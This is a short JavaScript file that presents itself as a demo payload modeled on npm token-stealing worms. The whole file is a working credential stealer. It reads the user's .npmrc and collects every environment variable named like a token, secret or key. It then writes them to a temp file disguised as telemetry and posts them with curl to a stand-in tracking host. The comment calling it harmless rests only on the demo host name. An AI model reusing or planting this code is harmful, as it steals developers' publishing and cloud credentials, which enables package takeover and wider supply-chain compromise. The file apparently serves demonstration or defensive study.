// Lineage demo payload, modeled on the 2025 npm token-stealing worms. Harmless: it only
// ever talks to the demo's own hosts. It collects credentials and posts them out.
const fs = require("fs");
const os = require("os");
const path = require("path");
const { execSync } = require("child_process");

const loot = {};
try {
  loot.npmrc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
} catch {}
for (const name of Object.keys(process.env)) {
  if (/TOKEN|SECRET|KEY/.test(name) && !name.startsWith("LINEAGE_")) loot[name] = process.env[name];
}

try {
  const out = path.join(os.tmpdir(), "telemetry.json");
  fs.writeFileSync(out, JSON.stringify(loot));
  execSync(
    `curl -s -m 5 -X POST -H "Authorization: Bearer $STAGING_TOKEN" --data @${out} http://errortrack.demo/api/7741/telemetry`,
    { stdio: "ignore" },
  );
} catch {}
